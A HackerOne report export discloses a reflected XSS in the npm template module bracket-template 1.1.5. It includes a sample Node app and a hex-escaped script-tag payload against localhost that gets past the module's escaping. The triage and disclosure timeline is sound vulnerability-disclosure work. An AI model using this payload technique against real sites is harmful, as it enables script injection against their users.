{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "eveeez", 
        "muhammad_uwais", 
        "khaledibnalwalid", 
        "whitesector", 
        "x1m", 
        "vibhuti_nath", 
        "japz", 
        "milind1997"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 317125, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-03-10T14:58:15.958Z", 
    "vulnerability_information": "Hi Guys,\n\nI would like to report Reflected XSS in bracket-template module.\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.\n\n## Module\n\n**module name:** bracket-template\n**version:** 1.1.5\n**npm page:** https://www.npmjs.com/package/bracket-template\n\n### Description\n\nMinimal (\u00fcber fast) Javascript engine compatible with node.js and browsers.\n\n### Module Stats\n\nStats:\n\n51 downloads in the last day\n209 downloads in the last week\n835 downloads in the last month\n\n~10000 estimated downloads per year\n\n## Description\n\nWhile testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.\n\n## Steps To Reproduce:\n\n- install ```bracket-template``` module:\n\n```\n$ npm install bracket-template\n```\n\n- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:\n\n```javascript\n// app.js file\nconst http = require('http')\nconst bracket = require('bracket-template').default\nconst port = 8080\n\nfunction createHTML(name) {\n    let tpl = `\n        [[ const n = '${name}'; ]]\n        <strong>Hello [[= n ]]</strong>\n    `\n    return bracket.compile(tpl)\n}\n\nconst requestHandler = (request, response) => {\n    const name = request.url.split('=')[1]\n    response.writeHeader(200, { \"Content-Type\": \"text/html\" });\n    response.write(createHTML(name)());\n    response.end();\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:\n\n{F264368}\n\n- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:\n\n{F264369}\n\n\n- this time, use following payload: ```http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e``` and see the result in browser dev tools console:\n\n\n{F264370}\n\n\nWhen we investigate HTML returned from the server, we can notice using ```\\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:\n\n```HTML\n<strong>Hello bl4de<script>console.log(\"uh oh, XSS... :(\")</script></strong>\n```\n\nAlso, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.\n\n\n## Supporting Material/References:\n\nThis issue was found and tested with following setup:\n\n- macOS HighSierra 10.13.3\n- Node.js v.8.9.3\n- npm v. 5.5.1\n- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)\n\n## Wrap up\n\n- I contacted the maintainer to let him know: No\n- I opened an issue in the related repository: No\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "changed", 
            "integrity": "none", 
            "availability": "none"
        }, 
        "rating": "high", 
        "score": 8.6, 
        "author_type": "Team"
    }, 
    "title": "[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template", 
    "is_member_of_team?": null, 
    "vote_count": 8, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "bracket-template", 
        "max_severity": "critical", 
        "databaseId": 6793, 
        "asset_type": "SOURCE_CODE"
    }, 
    "allow_singular_disclosure_at": "2018-04-09T14:58:16.031Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "1.png", 
            "type": "image/png", 
            "id": 264368, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222540Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=98f37e6056b0783d81d038cbef40cafe7959c326a4a7e0955a8199f4e776e0b7"
        }, 
        {
            "file_name": "2.png", 
            "type": "image/png", 
            "id": 264369, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222540Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f36b27d7703e11bee32034446694f9f95529aa8a17b417bac09de8608b00323d"
        }, 
        {
            "file_name": "3.png", 
            "type": "image/png", 
            "id": 264370, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222540Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efc271b73cdfd7ca5b1771f95606589a322bb88bccee058d1e8c3d68eca2ce97"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-02-17T20:20:52.135Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T20:20:52.135Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 2395359, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-17T20:21:26.934Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T20:21:26.934Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi\u00a0@bl4de ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n", 
            "markdown_message": "<p>Hi\u00a0@bl4de ,</p>\n\n<p>Thanks for reporting this issue.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2395361, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-17T22:30:28.231Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T22:30:28.231Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "I couldn't locate an e-mail address associated with the author so I opened a GitHub issue to ask to join us.", 
            "markdown_message": "<p>I couldn&#39;t locate an e-mail address associated with the author so I opened a GitHub issue to ask to join us.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2395465, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "old_scope": "Other module", 
            "created_at": "2018-03-10T14:57:55.131Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-10T14:57:55.131Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "new_scope": "bracket-template", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ChangedScope", 
            "id": 2479556, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bl4de", 
                "url": "/bl4de"
            }, 
            "created_at": "2018-03-10T14:58:08.687Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-10T14:58:08.687Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2479557, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-10T14:58:15.993Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-10T14:58:15.993Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2479558, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-10T14:58:38.352Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-10T14:58:38.352Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "I will continue a public disclosure since there's been no activity from the maintainers on this.", 
            "markdown_message": "<p>I will continue a public disclosure since there&#39;s been no activity from the maintainers on this.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2479559, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-09T14:58:20.229Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-09T14:58:20.229Z", 
            "actor": {
                "url": "/nodejs-ecosystem", 
                "profile": {
                    "name": "Node.js third-party modules"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
                }
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2581418, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-09T19:17:17.874Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-09T19:17:17.874Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "High (8.6)", 
                "old_severity": "Medium"
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2582994, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bl4de", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bl4de", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 61, 
        "name": "Cross-site Scripting (XSS) - Reflected"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -20849244.733212553, 
    "disclosed_at": "2018-04-09T14:58:19.748Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/317125", 
    "created_at": "2018-02-17T14:19:09.371Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p>I would like to report Reflected XSS in bracket-template module.<br>\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>module name:</strong> bracket-template<br>\n<strong>version:</strong> 1.1.5<br>\n<strong>npm page:</strong> <a title=\"https://www.npmjs.com/package/bracket-template\" href=\"/redirect?signature=b31e2a00f66648efb86d0467d5fcae615ab2ae74&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbracket-template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/bracket-template</span><i class=\"icon-external-link\"></i></a></p>\n\n<h3 id=\"description\">Description</h3>\n\n<p>Minimal (\u00fcber fast) Javascript engine compatible with node.js and browsers.</p>\n\n<h3 id=\"module-stats\">Module Stats</h3>\n\n<p>Stats:</p>\n\n<p>51 downloads in the last day<br>\n209 downloads in the last week<br>\n835 downloads in the last month</p>\n\n<p>~10000 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>While testing <code>bracket-template</code> module, I&#39;ve found that there is possibility to inject malicious <code>&lt;script&gt;</code> tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>bracket-template</code> module:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install bracket-template\n</code></pre>\n<ul>\n<li>create sample aaplication, which reads <code>name</code> from url and displays welcome message in the browser:</li>\n</ul>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// app.js file</span>\n<span class=\"kr\">const</span> <span class=\"nx\">http</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;http&#39;</span><span class=\"p\">)</span>\n<span class=\"kr\">const</span> <span class=\"nx\">bracket</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;bracket-template&#39;</span><span class=\"p\">).</span><span class=\"k\">default</span>\n<span class=\"kr\">const</span> <span class=\"nx\">port</span> <span class=\"o\">=</span> <span class=\"mi\">8080</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">createHTML</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">let</span> <span class=\"nx\">tpl</span> <span class=\"o\">=</span> <span class=\"s2\">`\n        [[ const n = &#39;</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">&#39;; ]]\n        &lt;strong&gt;Hello [[= n ]]&lt;/strong&gt;\n    `</span>\n    <span class=\"k\">return</span> <span class=\"nx\">bracket</span><span class=\"p\">.</span><span class=\"nx\">compile</span><span class=\"p\">(</span><span class=\"nx\">tpl</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n\n<span class=\"kr\">const</span> <span class=\"nx\">requestHandler</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">request</span><span class=\"p\">,</span> <span class=\"nx\">response</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">request</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">.</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"s1\">&#39;=&#39;</span><span class=\"p\">)[</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n    <span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nx\">writeHeader</span><span class=\"p\">(</span><span class=\"mi\">200</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"s2\">&quot;Content-Type&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;text/html&quot;</span> <span class=\"p\">});</span>\n    <span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"nx\">createHTML</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)());</span>\n    <span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nx\">end</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n\n<span class=\"kr\">const</span> <span class=\"nx\">server</span> <span class=\"o\">=</span> <span class=\"nx\">http</span><span class=\"p\">.</span><span class=\"nx\">createServer</span><span class=\"p\">(</span><span class=\"nx\">requestHandler</span><span class=\"p\">)</span>\n\n<span class=\"nx\">server</span><span class=\"p\">.</span><span class=\"nx\">listen</span><span class=\"p\">(</span><span class=\"nx\">port</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">`server is listening on </span><span class=\"p\">${</span><span class=\"nx\">port</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</code></pre>\n<ul>\n<li>run application:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ node app.js\n</code></pre>\n<ul>\n<li>open <code>http://localhost:8080?name=bl4de</code> in the browser. You will notice expected result:</li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=98f37e6056b0783d81d038cbef40cafe7959c326a4a7e0955a8199f4e776e0b7\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222540Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=98f37e6056b0783d81d038cbef40cafe7959c326a4a7e0955a8199f4e776e0b7\" class=\"markdown-inline-image\"></a></p>\n\n<ul>\n<li>now, try to inject following malicious XSS payload: <code>http://localhost:8080?name=bl4de&lt;script&gt;console.log(&#39;XSS?&#39;)&lt;/script&gt;</code>. You will notice all HTML special characters were escaped:</li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" 